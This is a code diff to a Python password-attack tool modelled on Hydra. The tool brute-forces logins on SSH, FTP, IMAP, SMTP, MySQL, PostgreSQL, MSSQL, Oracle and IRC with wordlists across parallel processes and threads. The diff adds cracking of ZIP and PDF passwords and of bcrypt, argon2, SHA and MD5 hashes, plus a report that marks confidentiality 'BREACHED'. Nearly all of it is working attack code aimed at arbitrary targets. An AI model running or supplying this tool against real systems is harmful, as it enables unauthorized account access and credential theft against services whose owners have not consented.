@@ -22,27 +22,29 @@ import zipfile         # ZIP bruteforce
 import pyzipper        # Use pyzipper for ZIP bruteforce (added)
 import pikepdf         # PDF password check (added)
 import bcrypt          # bcrypt hash
-
 from termcolor import colored
+from prettytable import PrettyTable
+from pathlib import Path
+
+# Argon2 support
+try:
+    from argon2 import PasswordHasher, exceptions as argon2_exceptions
+    ARGON2_AVAILABLE = True
+except ImportError:
+    ARGON2_AVAILABLE = False
 
 # ----------- Helper Functions ------------
 
-def dprint(msg, debug):
-    if debug:
-        print(colored(msg, attrs=['bold']))
-
 def vprint(msg, color=None, attrs=None):
-    if color:
-        print(colored(msg, color=color, attrs=attrs or ['bold']))
-    else:
-        print(colored(msg, attrs=['bold']))
+    allowed_colors = ["green", "red", "yellow", "cyan", None]
+    if color not in allowed_colors:
+        color = None
+    print(colored(msg, color=color, attrs=attrs or ['bold']))
 
 def format_attempt(proto, host, login, password, attempt_num, total, child_id, found, debug):
-    if debug:
-        msg = f'[ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (0/0)'
-        print(colored(msg, 'cyan', attrs=['bold']))
+    msg = f'[ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (0/0)'
+    print(colored(msg, 'cyan', attrs=['bold']))
     if found:
-        # Print found message
         port_map = {
             "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306, "postgres": 5432, "mssql": 1433,
             "irc": 6667, "oracle": 1521, "imap": 143
@@ -52,9 +54,6 @@ def format_attempt(proto, host, login, password, attempt_num, total, child_id, f
         print(colored(msg, 'green', attrs=['bold']))
 
 def format_status(host, found, proto, debug):
-    status = '[STATUS] attack finished for {} (waiting for children to complete tests)'.format(host)
-    if debug:
-        print(colored(status, 'yellow', attrs=['bold']))
     if found:
         vprint(f"1 of 1 target successfully completed, 1 valid password found", "green", ['bold'])
     else:
@@ -62,14 +61,6 @@ def format_status(host, found, proto, debug):
 
 def error_message(msg):
     print(colored(f'[ERROR] {msg}', 'red', attrs=['bold']))
-
-def verbose_message(msg):
-    print(colored(f'[VERBOSE] {msg}', 'blue', attrs=['bold']))
-
-def redo_attempt(host, login, password, attempt_num, total, child_id, found, debug):
-    if debug:
-        msg = f'[REDO-ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (1/1)'
-        print(colored(msg, 'magenta', attrs=['bold']))
 
 def info_message(msg):
     print(colored(f'[INFO] {msg}', 'cyan', attrs=['bold']))
@@ -105,24 +96,18 @@ class BruteForceWorker(threading.Thread):
                     except queue.Empty:
                         break
                     attempt_num += 1
-                    format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, False, self.debug)
+                    format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, False, False)
                     try:
                         success = self.target_func(username, password, self.child_id, attempt_num, self.total_attempts)
-                    except Exception as e:
-                        if self.debug:
-                            error_message(f"Unexpected error for {username}:{password} - {str(e)}")
-                            traceback.print_exc()
+                    except Exception:
                         continue
                     if success:
-                        format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, True, True)
+                        format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, True, False)
                         self.found = True
                         if self.result_flag:
                             self.result_flag.set()
                         return
-        except Exception as e:
-            if self.debug:
-                error_message(f"Thread error: {e}")
-                traceback.print_exc()
+        except Exception:
             return
 
 # ----------- Protocol bruteforce implementations with error handling ------------
@@ -140,9 +125,14 @@ def is_connection_refused(e):
     )
 
 # SSH
+_last_ssh_info = {}
 def ssh_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=22):
-    try:
+    global _last_ssh_info
+    ssh_info_key = f"{username}@{target_ip}:{port}"
+    if ssh_info_key not in _last_ssh_info:
         info_message(f'Testing if password authentication is supported by ssh://{username}@{target_ip}:{port}')
+        _last_ssh_info[ssh_info_key] = True
+    try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(target_ip, port=port, username=username, password=password, timeout=5, banner_timeout=5)
@@ -150,16 +140,13 @@ def ssh_bruteforce(username, password, child_id, attempt_num, total, target_ip=N
         info_message(f'Successful, password authentication is supported by ssh://{target_ip}:{port}')
         return True
     except paramiko.ssh_exception.AuthenticationException:
-        if debug:
-            dprint(f"[DEBUG] SSH fail: {username}:{password}", debug)
         return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-            error_message("ssh protocol error")
-        else:
-            if debug:
-                dprint(f"[DEBUG] SSH fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to ssh://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to ssh://{target_ip}:{port} - Connection refused")
         return False
 
 # FTP
@@ -170,16 +157,14 @@ def ftp_bruteforce(username, password, child_id, attempt_num, total, target_ip=N
         ftp.login(user=username, passwd=password)
         ftp.quit()
         return True
-    except ftplib.error_perm as e:
-        if debug:
-            dprint(f"[DEBUG] FTP fail: {username}:{password}", debug)
+    except ftplib.error_perm:
         return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] FTP fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to ftp://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to ftp://{target_ip}:{port} - Connection refused")
         return False
 
 # IMAP
@@ -194,77 +179,56 @@ def imap_bruteforce(username, password, child_id, attempt_num, total, target_ip=
             M.logout()
             return True
         else:
-            if debug:
-                dprint(f"[DEBUG] IMAP fail: {username}:{password}", debug)
             M.logout()
             return False
-    except imaplib.IMAP4.error as e:
-        if debug:
-            dprint(f"[DEBUG] IMAP fail: {username}:{password}", debug)
+    except imaplib.IMAP4.error:
         return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] IMAP fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to imap://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to imap://{target_ip}:{port} - Connection refused")
         return False
 
 # Oracle
 def oracle_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1521, debug=False):
     sids = ["ORCL", "XE", "ORACLE", "TEST"]
     services = ["XE", "orcl", "oracle", "test"]
-    tried = []
     for sid in sids:
         try:
             dsn = oracledb.makedsn(target_ip, port, sid=sid)
-            tried.append(f"SID:{sid}")
             conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
             conn.close()
             return True
         except oracledb.DatabaseError as e:
             err = str(e)
             if "ORA-01017" in err or "invalid username/password" in err.lower():
-                if debug:
-                    dprint(f"[DEBUG] Oracle fail: {username}:{password}", debug)
                 continue
             elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
-                error_message(f"could not connect to target port {port}: Socket error: {e}")
+                error_message(f"could not connect to oracle://{target_ip}:{port} - No route to host")
                 continue
             else:
-                if debug:
-                    dprint(f"[DEBUG] Oracle fail: {username}:{password} -> {e}", debug)
                 continue
         except Exception as e:
-            if debug:
-                dprint(f"[DEBUG] Oracle error (SID={sid}): {e}", debug)
             continue
     for service in services:
         try:
             dsn = oracledb.makedsn(target_ip, port, service_name=service)
-            tried.append(f"SERVICE:{service}")
             conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
             conn.close()
             return True
         except oracledb.DatabaseError as e:
             err = str(e)
             if "ORA-01017" in err or "invalid username/password" in err.lower():
-                if debug:
-                    dprint(f"[DEBUG] Oracle fail: {username}:{password}", debug)
                 continue
             elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
-                error_message(f"could not connect to target port {port}: Socket error: {e}")
+                error_message(f"could not connect to oracle://{target_ip}:{port} - No route to host")
                 continue
             else:
-                if debug:
-                    dprint(f"[DEBUG] Oracle fail: {username}:{password} -> {e}", debug)
                 continue
         except Exception as e:
-            if debug:
-                dprint(f"[DEBUG] Oracle error (SERVICE={service}): {e}", debug)
             continue
-    if debug:
-        dprint(f"[DEBUG] Oracle tried: {', '.join(tried)}", debug)
     return False
 
 # SMTP
@@ -279,15 +243,13 @@ def smtp_bruteforce(username, password, child_id, attempt_num, total, smtp_serve
         server.quit()
         return True
     except smtplib.SMTPAuthenticationError:
-        if debug:
-            dprint(f"[DEBUG] SMTP fail: {username}:{password}", debug)
         return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] SMTP fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to smtp://{smtp_server}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to smtp://{smtp_server}:{port} - Connection refused")
         return False
 
 # MySQL
@@ -298,22 +260,18 @@ def mysql_bruteforce(username, password, child_id, attempt_num, total, target_ip
         return True
     except pymysql.err.OperationalError as e:
         if "Access denied" in str(e):
-            if debug:
-                dprint(f"[DEBUG] MySQL fail: {username}:{password}", debug)
             return False
         elif is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
+            error_message(f"could not connect to mysql://{target_ip}:{port} - Connection refused")
             return False
         else:
-            if debug:
-                dprint(f"[DEBUG] MySQL fail: {username}:{password} -> {e}", debug)
             return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] MySQL fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to mysql://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to mysql://{target_ip}:{port} - Connection refused")
         return False
 
 # PostgreSQL
@@ -324,22 +282,18 @@ def postgres_bruteforce(username, password, child_id, attempt_num, total, target
         return True
     except psycopg2.OperationalError as e:
         if "authentication failed" in str(e).lower():
-            if debug:
-                dprint(f"[DEBUG] PostgreSQL fail: {username}:{password}", debug)
             return False
         elif is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
+            error_message(f"could not connect to postgres://{target_ip}:{port} - Connection refused")
             return False
         else:
-            if debug:
-                dprint(f"[DEBUG] PostgreSQL fail: {username}:{password} -> {e}", debug)
             return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] PostgreSQL fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to postgres://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to postgres://{target_ip}:{port} - Connection refused")
         return False
 
 # MSSQL
@@ -350,22 +304,18 @@ def mssql_bruteforce(username, password, child_id, attempt_num, total, target_ip
         return True
     except pymssql.OperationalError as e:
         if "login failed" in str(e).lower():
-            if debug:
-                dprint(f"[DEBUG] MSSQL fail: {username}:{password}", debug)
             return False
         elif is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
+            error_message(f"could not connect to mssql://{target_ip}:{port} - Connection refused")
             return False
         else:
-            if debug:
-                dprint(f"[DEBUG] MSSQL fail: {username}:{password} -> {e}", debug)
             return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] MSSQL fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to mssql://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to mssql://{target_ip}:{port} - Connection refused")
         return False
 
 # IRC
@@ -383,24 +333,14 @@ def irc_bruteforce(username, password, child_id, attempt_num, total, target_ip=N
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(7)
                     s.connect((target_ip, port))
-                    try:
-                        banner = s.recv(512)
-                        if debug:
-                            dprint(f"IRC Banner ({encoding}): {banner.decode(encoding, errors='replace')}", debug)
-                    except Exception:
-                        pass
                     for cmd, val in flow:
                         msg = f"{cmd} {val}\r\n".encode(encoding)
                         s.sendall(msg)
-                        if debug:
-                            dprint(f"Sent: {msg}", debug)
                         time.sleep(0.2)
                     try:
                         s.settimeout(2)
                         reply = s.recv(4096)
                         resp = reply.decode(encoding, errors="replace")
-                        if debug:
-                            dprint(f"IRC Reply: {resp}", debug)
                         if any(word in resp.lower() for word in [
                             "001", "002", "welcome", "your host", "ircop", "mode", "motd", "end of",
                             "you are now", "privileges", "logged in", "success", "nick registered"
@@ -410,30 +350,20 @@ def irc_bruteforce(username, password, child_id, attempt_num, total, target_ip=N
                         elif any(word in resp.lower() for word in [
                             "throttle", "too many", "wait", "flood", "reconnect", "denied"
                         ]):
-                            if debug:
-                                dprint("[!] IRC server is throttling/flood rejecting, try slower or later.", debug)
                             s.close()
                             return False
-                        else:
-                            if debug:
-                                dprint(f"[DEBUG] IRC fail: {username}:{password} (encoding={encoding})", debug)
                     except socket.timeout:
-                        if debug:
-                            dprint("IRC no reply (timeout)", debug)
-                    except Exception as e:
-                        if debug:
-                            dprint(f"IRC error reading reply: {e}", debug)
+                        pass
                     s.close()
-                except Exception as e:
-                    if debug:
-                        dprint(f"IRC error with combo {flow} and encoding {encoding}: {e}", debug)
+                except Exception:
+                    pass
         return False
     except Exception as e:
-        if is_connection_refused(e):
-            error_message(f"could not connect to target port {port}: Socket error: {e}")
-        else:
-            if debug:
-                dprint(f"[DEBUG] IRC fail: {username}:{password} -> {e}", debug)
+        msg = str(e).lower()
+        if "no route to host" in msg:
+            error_message(f"could not connect to irc://{target_ip}:{port} - No route to host")
+        elif is_connection_refused(e):
+            error_message(f"could not connect to irc://{target_ip}:{port} - Connection refused")
         return False
 
 # ----------- Multiprocessing BruteForce Manager ------------
@@ -449,13 +379,116 @@ def multi_worker(target_func, usernames, passwords, debug, result_flag, proto, h
     total_attempts = len(usernames) * len(passwords)
     threads = []
     for _ in range(4):  # 4 threads per process (tunable)
-        t = BruteForceWorker(target_func, username_queue, password_queue, debug=debug,
+        t = BruteForceWorker(target_func, username_queue, password_queue, debug=False,
                              result_flag=result_flag, proto=proto, host=host, total_attempts=total_attempts,
                              child_id=child_id)
         threads.append(t)
         t.start()
     for t in threads:
         t.join()
+
+# ----------- File Crack Report -----------
+
+def print_cracking_report(target_type, identifier, hash_algo, status, password, attempts, time_taken, impact):
+    table = PrettyTable()
+    table.header = False
+    table.border = True
+    table.add_row(["+-------------------------------------------------------------+"])
+    table.add_row(["|                      CRACKING REPORT                         |"])
+    table.add_row(["+-------------------------------------------------------------+"])
+    table.add_row([f"| Target Type       : {target_type.ljust(44)}|"])
+    table.add_row([f"| Target Identifier : {identifier[:46]}|"])
+    table.add_row([f"| Hash Algorithm    : {hash_algo.ljust(44)}|"])
+    table.add_row([f"| Status            : {status.ljust(44)}|"])
+    table.add_row([f"| Password Found    : {password.ljust(44)}|"])
+    table.add_row([f"| Attempts          : {str(attempts).ljust(44)}|"])
+    table.add_row([f"| Time Taken        : {time_taken.ljust(44)}|"])
+    table.add_row(["+-------------------------------------------------------------+"])
+    table.add_row([f"| Impact Analysis                                              "])
+    for k, v in impact.items():
+        table.add_row([f"| - {k.ljust(16)}: {v.ljust(43)}|"])
+    table.add_row(["+-------------------------------------------------------------+"])
+    print(table.get_string(fields=table.field_names))
+
+# ----------- Hash Cracking -----------
+
+def detect_hash_type(hashval):
+    # bcrypt
+    if hashval.startswith('$2a$') or hashval.startswith('$2b$') or hashval.startswith('$2y$'):
+        return 'bcrypt'
+    # argon2
+    elif hashval.startswith('$argon2'):
+        return 'argon2'
+    # sha1
+    elif len(hashval) == 40 and all(c in '0123456789abcdef' for c in hashval.lower()):
+        return 'sha1'
+    # sha256
+    elif len(hashval) == 64 and all(c in '0123456789abcdef' for c in hashval.lower()):
+        return 'sha256'
+    # sha512 or blake2b (both 128 hex)
+    elif len(hashval) == 128 and all(c in '0123456789abcdef' for c in hashval.lower()):
+        # Try sha512 first, then blake2b
+        return 'sha512_blake2b'
+    # md5
+    elif len(hashval) == 32 and all(c in '0123456789abcdef' for c in hashval.lower()):
+        return 'md5'
+    else:
+        return 'unknown'
+
+def try_hash(password, hashval):
+    # Try all hashes
+    results = {}
+
+    # bcrypt
+    try:
+        if (hashval.startswith('$2a$') or hashval.startswith('$2b$') or hashval.startswith('$2y$')):
+            results['bcrypt'] = bcrypt.checkpw(password.encode(), hashval.encode())
+    except Exception:
+        results['bcrypt'] = False
+
+    # argon2
+    if ARGON2_AVAILABLE and hashval.startswith('$argon2'):
+        try:
+            ph = PasswordHasher()
+            results['argon2'] = ph.verify(hashval, password)
+        except argon2_exceptions.VerifyMismatchError:
+            results['argon2'] = False
+        except Exception:
+            results['argon2'] = False
+
+    # sha1
+    try:
+        if len(hashval) == 40 and all(c in '0123456789abcdef' for c in hashval.lower()):
+            results['sha1'] = hashlib.sha1(password.encode()).hexdigest() == hashval
+    except Exception:
+        results['sha1'] = False
+
+    # sha256
+    try:
+        if len(hashval) == 64 and all(c in '0123456789abcdef' for c in hashval.lower()):
+            results['sha256'] = hashlib.sha256(password.encode()).hexdigest() == hashval
+    except Exception:
+        results['sha256'] = False
+
+    # sha512
+    try:
+        if len(hashval) == 128 and all(c in '0123456789abcdef' for c in hashval.lower()):
+            results['sha512'] = hashlib.sha512(password.encode()).hexdigest() == hashval
+            # blake2b
+            results['blake2b'] = hashlib.blake2b(password.encode()).hexdigest() == hashval
+    except Exception:
+        results['sha512'] = False
+        results['blake2b'] = False
+
+    # md5
+    try:
+        if len(hashval) == 32 and all(c in '0123456789abcdef' for c in hashval.lower()):
+            results['md5'] = hashlib.md5(password.encode()).hexdigest() == hashval
+    except Exception:
+        results['md5'] = False
+
+    # Return True if any matched
+    return any(results.values()), results
 
 # ----------- Main CLI ------------
 
@@ -466,7 +499,7 @@ def main():
     parser.add_argument("-L", "--userlist", help="File with multiple usernames")
     parser.add_argument("-P", "--passlist", required=True, help="Password list file")
     parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
-    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output")
+    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output (DEPRECATED, IGNORED)")
     parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
     parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (for SMTP or IMAP)")
     parser.add_argument("-f", "--file", help="File path (for zip/hash/pdf bruteforce)")
@@ -498,15 +531,117 @@ def main():
     # ---- FILE MODE -----
     if args.file and not args.target:
         file_lower = args.file.lower()
+        start_time = time.time()
+        password_found = None
+        attempts = 0
+        status = "FAILURE"
         if file_lower.endswith(".zip"):
-            # ... (ZIP brute logic, not hydra-style - omitted for brevity)
-            pass
+            identifier = args.file
+            hash_algo = "N/A"
+            try:
+                with pyzipper.AESZipFile(args.file) as zf:
+                    for pwd in passwords:
+                        attempts += 1
+                        try:
+                            zf.extractall(pwd=pwd.encode('utf-8'))
+                            password_found = pwd
+                            status = "SUCCESS"
+                            break
+                        except Exception:
+                            continue
+            except Exception as e:
+                error_message(f"Failed to open ZIP file: {e}")
+                sys.exit(1)
+            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
+            print_cracking_report(
+                "ZIP FILE",
+                identifier,
+                hash_algo,
+                status,
+                password_found or "N/A",
+                attempts,
+                time_taken,
+                {
+                    "Confidentiality": "BREACHED" if status == "SUCCESS" else "SECURE",
+                    "Integrity": "COMPROMISED" if status == "SUCCESS" else "INTACT",
+                    "Availability": "UNAFFECTED"
+                }
+            )
         elif file_lower.endswith(".pdf"):
-            # ... (PDF brute logic, not hydra-style - omitted for brevity)
-            pass
+            identifier = args.file
+            hash_algo = "N/A"
+            try:
+                for pwd in passwords:
+                    attempts += 1
+                    try:
+                        with pikepdf.open(args.file, password=pwd):
+                            password_found = pwd
+                            status = "SUCCESS"
+                            break
+                    except Exception:
+                        continue
+            except Exception as e:
+                error_message(f"Failed to open PDF file: {e}")
+                sys.exit(1)
+            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
+            print_cracking_report(
+                "PDF FILE",
+                identifier,
+                hash_algo,
+                status,
+                password_found or "N/A",
+                attempts,
+                time_taken,
+                {
+                    "Confidentiality": "SECURE" if status == "FAILURE" else "BREACHED",
+                    "Integrity": "INTACT",
+                    "Availability": "UNAFFECTED"
+                }
+            )
         elif file_lower.endswith(".hash"):
-            # ... (HASH brute logic, not hydra-style - omitted for brevity)
-            pass
+            identifier = None
+            hashval = ""
+            try:
+                with open(args.file, 'r') as f:
+                    hashval = f.read().strip()
+            except Exception as e:
+                error_message(f"Failed to open hash file: {e}")
+                sys.exit(1)
+            # Find the type for display (but try all anyway)
+            hash_type = detect_hash_type(hashval)
+            hash_algo = {
+                'bcrypt': 'bcrypt',
+                'argon2': 'argon2',
+                'sha1': 'SHA-1',
+                'sha256': 'SHA-256',
+                'sha512_blake2b': 'SHA-512/BLAKE2b',
+                'md5': 'MD5',
+                'unknown': 'Unknown'
+            }.get(hash_type, 'Unknown')
+            identifier = hashval[:32] + "..." if len(hashval) > 32 else hashval
+            for pwd in passwords:
+                attempts += 1
+                ok, allres = try_hash(pwd, hashval)
+                if ok:
+                    password_found = pwd
+                    status = "SUCCESS"
+                    hash_algo = "/".join([k.upper() for k, v in allres.items() if v])
+                    break
+            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
+            print_cracking_report(
+                "HASH",
+                identifier,
+                hash_algo,
+                status,
+                password_found or "N/A",
+                attempts,
+                time_taken,
+                {
+                    "Confidentiality": "BREACHED" if status == "SUCCESS" else "SECURE",
+                    "Integrity": "INTACT",
+                    "Availability": "UNAFFECTED"
+                }
+            )
         else:
             error_message(f"Unknown file type for brute-force: {args.file}")
             sys.exit(1)
@@ -556,23 +691,23 @@ def main():
 
     # Select target function based on protocol
     if proto == "ssh":
-        target_func = lambda u, p, child_id, attempt_num, total: ssh_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=args.dbg, port=target_port or 22)
+        target_func = lambda u, p, child_id, attempt_num, total: ssh_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=False, port=target_port or 22)
     elif proto == "ftp":
-        target_func = lambda u, p, child_id, attempt_num, total: ftp_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=args.dbg, port=target_port or 21)
+        target_func = lambda u, p, child_id, attempt_num, total: ftp_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=False, port=target_port or 21)
     elif proto == "smtp":
-        target_func = lambda u, p, child_id, attempt_num, total: smtp_bruteforce(u, p, child_id, attempt_num, total, smtp_server=target_ip, port=target_port, use_ssl=args.ssl, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: smtp_bruteforce(u, p, child_id, attempt_num, total, smtp_server=target_ip, port=target_port, use_ssl=args.ssl, debug=False)
     elif proto == "mysql":
-        target_func = lambda u, p, child_id, attempt_num, total: mysql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 3306, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: mysql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 3306, debug=False)
     elif proto == "postgres":
-        target_func = lambda u, p, child_id, attempt_num, total: postgres_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 5432, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: postgres_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 5432, debug=False)
     elif proto == "mssql":
-        target_func = lambda u, p, child_id, attempt_num, total: mssql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1433, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: mssql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1433, debug=False)
     elif proto == "irc":
-        target_func = lambda u, p, child_id, attempt_num, total: irc_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 6667, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: irc_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 6667, debug=False)
     elif proto == "oracle":
-        target_func = lambda u, p, child_id, attempt_num, total: oracle_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1521, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: oracle_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1521, debug=False)
     elif proto == "imap":
-        target_func = lambda u, p, child_id, attempt_num, total: imap_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or (993 if args.ssl else 143), use_ssl=args.ssl, debug=args.dbg)
+        target_func = lambda u, p, child_id, attempt_num, total: imap_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or (993 if args.ssl else 143), use_ssl=args.ssl, debug=False)
     else:
         error_message(f"Protocol {proto} not implemented.")
         sys.exit(1)
@@ -590,26 +725,24 @@ def main():
         password_chunks[-1].extend(passwords[sum(len(x) for x in password_chunks):])
 
     procs = []
-    for i in range(num_procs):
-        p = multiprocessing.Process(
-            target=multi_worker,
-            args=(target_func, usernames, password_chunks[i], args.dbg, result_flag, proto, target_ip, i)
-        )
-        procs.append(p)
-        p.start()
-
-    # --- Monitor for result_flag ---
-    password_found = False
     try:
+        for i in range(num_procs):
+            p = multiprocessing.Process(
+                target=multi_worker,
+                args=(target_func, usernames, password_chunks[i], False, result_flag, proto, target_ip, i)
+            )
+            procs.append(p)
+            p.start()
+
+        # --- Monitor for result_flag ---
+        password_found = False
         while True:
             if result_flag.is_set():
-                # Terminate all processes ASAP
                 for p in procs:
                     if p.is_alive():
                         p.terminate()
                 password_found = True
                 break
-            # If all procs finished, break
             if all(not p.is_alive() for p in procs):
                 break
             time.sleep(0.1)
@@ -617,14 +750,26 @@ def main():
         for p in procs:
             if p.is_alive():
                 p.terminate()
+        print(colored("\n[INFO] Interrupted by user. Exiting cleanly.", "yellow", ["bold"]))
+        sys.exit(0)
+    except Exception as e:
+        error_message(f"Unexpected error: {e}")
+        for p in procs:
+            if p.is_alive():
+                p.terminate()
         sys.exit(1)
 
-    # Wait for all to finish
     for p in procs:
         p.join()
 
-    # Print final status
-    format_status(target_ip, password_found, proto, args.dbg)
+    format_status(target_ip, password_found, proto, False)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(colored("\n[INFO] Interrupted by user. Exiting cleanly.", "yellow", ["bold"]))
+        sys.exit(0)
+    except Exception as e:
+        error_message(f"Fatal error: {e}")
+        sys.exit(1)
